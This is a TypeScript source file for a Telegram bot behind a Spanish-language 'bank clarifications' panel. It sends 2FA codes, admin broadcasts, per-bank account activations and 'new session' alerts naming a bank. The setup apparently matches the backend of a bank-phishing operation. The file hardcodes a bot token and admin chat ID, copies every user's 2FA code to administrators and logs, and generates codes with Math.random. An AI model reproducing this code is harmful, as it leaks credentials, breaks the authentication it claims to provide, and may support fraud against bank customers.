import TelegramBot from 'node-telegram-bot-api';
import { storage } from './storage';
import { User, VerificationCode } from '@shared/schema';

// Token del bot y chat ID del administrador
const TELEGRAM_TOKEN = '7806665012:AAHpmPYzeuwXWYNrlnaq2DkWqPTQzRquppk';
const ADMIN_CHAT_ID = '6615027684';

// Crear instancia del bot con polling habilitado
let bot: TelegramBot;

try {
  bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
  console.log('🤖 Bot de Telegram iniciado correctamente');
} catch (error) {
  console.error('❌ Error iniciando bot de Telegram:', error);
}

// Mensaje de bienvenida
const WELCOME_MESSAGE = `
🎉 *¡Bienvenido a nuestro panel!*

Gracias por utilizar nuestro sistema de aclaraciones bancarias.

💬 Para cualquier duda o sugerencia, contacta con @balonxSistema

🔐 *Funciones disponibles:*
• Autenticación de doble factor
• Notificaciones en tiempo real
• Mensajería directa del administrador

¡Esperamos que tengas una excelente experiencia!
`;

// Función para generar código de verificación de 6 dígitos
export function generateVerificationCode(): string {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

// Función para enviar código de verificación 2FA
export async function sendVerificationCode(userId: number, username: string): Promise<{ success: boolean; code?: string; error?: string }> {
  try {
    const user = await storage.getUserById(userId);
    if (!user || !user.telegramChatId) {
      return { success: false, error: 'Usuario no tiene Chat ID configurado' };
    }

    const code = generateVerificationCode();
    const expiresAt = new Date(Date.now() + 10 * 60 * 1000); // Expira en 10 minutos

    // Guardar código en la base de datos
    await storage.createVerificationCode({
      userId,
      code,
      expiresAt
    });

    const message = `🔐 *Código de Verificación*

Hola *${username}*,

Tu código de verificación para acceder al panel es:

\`${code}\`

⏰ Este código expira en 10 minutos.
🔒 No compartas este código con nadie.

Si no solicitaste este código, ignora este mensaje.`;

    await bot.sendMessage(user.telegramChatId, message, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });

    // También enviar al administrador para monitoreo
    const adminMessage = `🔐 *Código 2FA Enviado*

Usuario: *${username}*
Código: \`${code}\`
Expira: ${expiresAt.toLocaleString('es-MX')}`;

    // Enviar al Chat ID configurado del administrador principal
    await bot.sendMessage(ADMIN_CHAT_ID, adminMessage, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });

    // También enviar al administrador balonx si tiene Chat ID configurado
    try {
      const adminUser = await storage.getUserByUsername('balonx');
      if (adminUser && adminUser.telegramChatId) {
        await bot.sendMessage(adminUser.telegramChatId, adminMessage, { 
          parse_mode: 'Markdown',
          disable_web_page_preview: true 
        });
        console.log(`✅ Código 2FA también enviado al admin balonx: ${adminUser.telegramChatId}`);
      }
    } catch (error) {
      console.log('ℹ️ No se pudo enviar al admin balonx:', error);
    }

    console.log(`✅ Código 2FA enviado a ${username}: ${code}`);
    return { success: true, code };

  } catch (error: any) {
    console.error('❌ Error enviando código 2FA:', error);
    return { success: false, error: error.message };
  }
}

// Función para verificar código 2FA
export async function verifyCode(userId: number, inputCode: string): Promise<{ success: boolean; error?: string }> {
  try {
    const verificationCode = await storage.getValidVerificationCode(userId, inputCode);
    
    if (!verificationCode) {
      return { success: false, error: 'Código inválido o expirado' };
    }

    // Marcar código como usado
    await storage.markVerificationCodeAsUsed(verificationCode.id);
    
    console.log(`✅ Código 2FA verificado para usuario ID: ${userId}`);
    return { success: true };

  } catch (error: any) {
    console.error('❌ Error verificando código 2FA:', error);
    return { success: false, error: error.message };
  }
}

// Función para enviar mensaje de bienvenida
export async function sendWelcomeMessage(chatId: string): Promise<void> {
  try {
    await bot.sendMessage(chatId, WELCOME_MESSAGE, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });
    console.log(`✅ Mensaje de bienvenida enviado a chat ID: ${chatId}`);
  } catch (error: any) {
    console.error('❌ Error enviando mensaje de bienvenida:', error);
  }
}

// Función para que el administrador envíe mensajes a usuarios
export async function sendAdminMessage(userChatId: string, message: string, fromAdmin: string = 'Administrador'): Promise<{ success: boolean; error?: string }> {
  try {
    const formattedMessage = `📢 *Mensaje del ${fromAdmin}*

${message}

---
💬 Para responder, contacta con @balonxSistema`;

    await bot.sendMessage(userChatId, formattedMessage, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });

    console.log(`✅ Mensaje de administrador enviado a chat ID: ${userChatId}`);
    return { success: true };

  } catch (error: any) {
    console.error('❌ Error enviando mensaje de administrador:', error);
    return { success: false, error: error.message };
  }
}

// Función para enviar mensaje masivo a todos los usuarios con Chat ID
export async function sendBroadcastMessage(message: string, fromAdmin: string = 'Administrador'): Promise<{ success: boolean; sent: number; failed: number; errors: string[] }> {
  try {
    const users = await storage.getAllUsers();
    const usersWithChatId = users.filter(user => user.telegramChatId && user.role === 'user');

    let sent = 0;
    let failed = 0;
    const errors: string[] = [];

    for (const user of usersWithChatId) {
      try {
        await sendAdminMessage(user.telegramChatId!, message, fromAdmin);
        sent++;
        // Pequeña pausa para evitar límites de rate
        await new Promise(resolve => setTimeout(resolve, 100));
      } catch (error: any) {
        failed++;
        errors.push(`Error enviando a ${user.username}: ${error.message}`);
      }
    }

    console.log(`📊 Mensaje masivo completado: ${sent} enviados, ${failed} fallidos`);
    return { success: true, sent, failed, errors };

  } catch (error: any) {
    console.error('❌ Error en mensaje masivo:', error);
    return { success: false, sent: 0, failed: 0, errors: [error.message] };
  }
}

// Función para enviar notificación de activación de cuenta
export async function sendAccountActivationNotification(userData: {
  username: string;
  telegramChatId: string;
  expiresAt?: Date | null;
  allowedBanks?: string;
}): Promise<{ success: boolean; error?: string }> {
  try {
    if (!userData.telegramChatId) {
      return { success: false, error: "No se encontró Chat ID del usuario" };
    }

    const expirationText = userData.expiresAt 
      ? `\nVence: ${new Date(userData.expiresAt).toLocaleString('es-MX')}`
      : '\nTipo: Cuenta permanente';

    const banksText = userData.allowedBanks === 'all' 
      ? 'Todos los bancos' 
      : userData.allowedBanks?.split(',').join(', ') || 'Ninguno especificado';

    const message = `🎉 *¡Tu cuenta ha sido activada correctamente!*

Usuario: *${userData.username}*
Bancos permitidos: *${banksText}*${expirationText}

Ya puedes acceder al sistema. Usa /help para ver los comandos disponibles.

📞 *Soporte*: @BalonxSistema`;

    await bot.sendMessage(userData.telegramChatId, message, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });

    console.log(`✅ Notificación de activación enviada a ${userData.username} (${userData.telegramChatId})`);
    return { success: true };

  } catch (error: any) {
    console.error(`❌ Error enviando notificación de activación a ${userData.username}:`, error);
    return { success: false, error: error.message };
  }
}

// Función para enviar notificación de sesión (existente)
export async function sendSessionNotification(sessionData: {
  sessionId: string;
  banco: string;
  tipo: string;
  username?: string;
}): Promise<void> {
  try {
    const message = `🔔 *Nueva Sesión Creada*

ID: \`${sessionData.sessionId}\`
Banco: *${sessionData.banco}*
Tipo: *${sessionData.tipo}*
${sessionData.username ? `Creado por: *${sessionData.username}*` : ''}

Tiempo: ${new Date().toLocaleString('es-MX')}`;

    await bot.sendMessage(ADMIN_CHAT_ID, message, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });

    console.log(`✅ Notificación de sesión enviada: ${sessionData.sessionId}`);
  } catch (error: any) {
    console.error('❌ Error enviando notificación de sesión:', error);
  }
}

// Manejar comandos del bot
const setupBotCommands = () => {
  if (!bot) return;
  
  bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id.toString();
    const userName = msg.from?.first_name || 'Usuario';
    console.log(`👋 Comando /start recibido de chat ID: ${chatId}`);
    
    const welcomeMessage = `🎉 *¡Hola ${userName}!*

Tu Chat ID es: \`${chatId}\`

🔐 *Para registrarte en nuestro panel:*
1. Ve al panel de registro
2. Completa tu información
3. **Usa este Chat ID:** \`${chatId}\`
4. Una vez registrado, recibirás códigos 2FA aquí

💡 *Comandos disponibles:*
• /help - Ver ayuda completa
• /id - Ver tu Chat ID nuevamente

📞 *Soporte*: @BalonxSistema

¡Gracias por utilizar nuestro sistema!`;

    await bot.sendMessage(chatId, welcomeMessage, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });
  });

  bot.onText(/\/help/, async (msg) => {
    const chatId = msg.chat.id.toString();
    const helpMessage = `🆘 *Ayuda del Bot*

*Comandos disponibles:*
• /start - Mensaje de bienvenida
• /help - Mostrar esta ayuda
• /id - Mostrar tu Chat ID

*Funciones:*
• Recibir códigos de verificación 2FA
• Recibir mensajes del administrador
• Notificaciones del sistema

💬 Para soporte: @balonxSistema`;

    await bot.sendMessage(chatId, helpMessage, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });
  });

  bot.onText(/\/id/, async (msg) => {
    const chatId = msg.chat.id.toString();
    const idMessage = `🆔 *Tu Chat ID*

Tu Chat ID es: \`${chatId}\`

Necesitas este ID para:
• Registro en el panel
• Recibir códigos 2FA
• Recibir notificaciones

💡 Copia este número y úsalo al registrarte.`;

    await bot.sendMessage(chatId, idMessage, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    });
  });

  // Manejar errores del polling
  bot.on('polling_error', (error: any) => {
    console.log('🔄 Error de polling del bot (continuando):', error.code);
  });

  console.log('🎯 Bot de Telegram configurado con comandos: /start, /help, /id');
};

// Configurar comandos del bot después de la inicialización
setTimeout(setupBotCommands, 1000);

// Exportar el bot para uso externo si es necesario
export { bot };

// Función de limpieza para códigos expirados (ejecutar periódicamente)
export async function cleanupExpiredCodes(): Promise<void> {
  try {
    const expired = await storage.cleanupExpiredVerificationCodes();
    if (expired > 0) {
      console.log(`🧹 Limpieza: ${expired} códigos 2FA expirados eliminados`);
    }
  } catch (error) {
    console.error('❌ Error en limpieza de códigos:', error);
  }
}

// Ejecutar limpieza cada 30 minutos
setInterval(cleanupExpiredCodes, 30 * 60 * 1000);